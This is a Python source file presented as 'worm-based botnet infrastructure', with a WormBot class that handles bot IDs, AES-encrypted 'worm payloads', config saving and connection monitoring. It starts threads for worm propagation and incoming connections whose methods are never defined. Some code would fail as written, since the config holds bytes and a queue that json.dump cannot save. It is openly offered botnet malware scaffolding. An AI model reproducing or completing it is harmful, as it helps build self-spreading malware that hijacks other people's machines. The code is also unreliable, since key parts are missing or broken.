#!/usr/bin/env python3
"""
Worm-based Botnet Infrastructure with SOCKS5 Proxy
"""
import os
import sys
import socket
import threading
import time
import hashlib
import random
import base64
import json
import struct
import subprocess
import winreg
import dns.resolver
import dns.message
import dns.query
import socks
import requests
import ssl
import logging
import signal
import queue
from collections import deque
from datetime import datetime

# Import for encryption functions
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class WormBot:
    def __init__(self):
        self.config = {
            'worm_id': hashlib.sha256(os.urandom(16)).hexdigest()[:16],
            'proxy_list': [],
            'target_domains': [],
            'connection_queue': queue.Queue(),
            'active_connections': {},
            'botnet_nodes': set(),
            'dns_servers': ['8.8.8.8', '1.1.1.1', '114.114.114.114'],
            'port_range': (10000, 65535),
            'max_retries': 5,
            'retry_delay': 10,
            'log_level': 'INFO',
            'debug_mode': False,
            'encryption_key': os.urandom(32)  # 256-bit key
        }
        
        # Load configuration from file
        self.load_config()
        
        # Setup DNS resolver
        self.dns_resolver = dns.resolver.Resolver()
        self.dns_resolver.nameservers = self.config['dns_servers']
        
        # Signal handlers
        signal.signal(signal.SIGTERM, self.shutdown)
        signal.signal(signal.SIGINT, self.shutdown)
        
        logger.info(f"Bot initialized with ID: {self.config['worm_id']}")

    def load_config(self):
        """Load configuration from file"""
        config_file = 'bot_config.json'
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    loaded_config = json.load(f)
                    self.config.update(loaded_config)
                    logger.info("Configuration loaded successfully")
            except Exception as e:
                logger.error(f"Error loading config: {e}")

    def save_config(self):
        """Save configuration to file"""
        try:
            with open('bot_config.json', 'w') as f:
                json.dump(self.config, f, indent=4)
            logger.info("Configuration saved successfully")
        except Exception as e:
            logger.error(f"Error saving config: {e}")

    def encrypt_worm_payload(self, payload):
        """Encrypt worm payload using AES-CBC"""
        try:
            # Pad payload to AES block size
            padded_payload = pad(payload, AES.block_size)
            
            # Encrypt payload
            cipher = AES.new(self.config['encryption_key'], AES.MODE_CBC)
            iv = cipher.iv
            encrypted_payload = cipher.encrypt(padded_payload)
            
            # Return encrypted payload with IV prepended
            return iv + encrypted_payload
        except Exception as e:
            logger.error(f"Encryption error: {e}")
            raise

    def verify_worm_payload(self, payload):
        """Verify and decrypt worm payload"""
        try:
            # Extract IV from payload
            iv = payload[:16]
            encrypted_payload = payload[16:]
            
            # Decrypt payload
            cipher = AES.new(self.config['encryption_key'], AES.MODE_CBC, iv)
            decrypted_payload = cipher.decrypt(encrypted_payload)
            
            # Unpad payload
            unpadded_payload = unpad(decrypted_payload, AES.block_size)
            
            # Parse payload
            lines = unpadded_payload.decode().split('\n')
            config = {}
            
            for line in lines:
                if ':' in line:
                    key, value = line.split(':', 1)
                    config[key.strip()] = value.strip()
                    
            return config
        except Exception as e:
            logger.error(f"Payload verification failed: {e}")
            return None

    def monitor_connections(self):
        """Monitor active connections"""
        while True:
            try:
                # Check active connections
                current_time = datetime.now()
                expired = []
                
                for conn_id, info in self.config['active_connections'].items():
                    last_seen = datetime.fromisoformat(info['last_seen'])
                    if (current_time - last_seen).seconds > 300:  # 5 minutes
                        expired.append(conn_id)
                
                # Remove expired connections
                for conn_id in expired:
                    del self.config['active_connections'][conn_id]
                    logger.info(f"Removed expired connection: {conn_id}")
                
                self.save_config()
                time.sleep(30)
            except Exception as e:
                logger.error(f"Connection monitoring error: {e}")
                time.sleep(30)

    def run(self):
        """Main botnet execution loop"""
        logger.info("Starting botnet infrastructure...")
        
        # Start threads
        threading.Thread(target=self.handle_incoming_connections, daemon=True).start()
        threading.Thread(target=self.propagate_worm, daemon=True).start()
        threading.Thread(target=self.monitor_connections, daemon=True).start()
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.shutdown()

    def shutdown(self, signum=None, frame=None):
        """Shutdown botnet gracefully"""
        logger.info("Shutting down botnet infrastructure...")
        
        # Clean up resources
        for conn_id in list(self.config['active_connections'].keys()):
            try:
                # Close connection
                pass
            except:
                pass
                
        # Save configuration
        self.save_config()
        
        # Exit
        sys.exit(0)

if __name__ == "__main__":
    bot = WormBot()
    bot.run()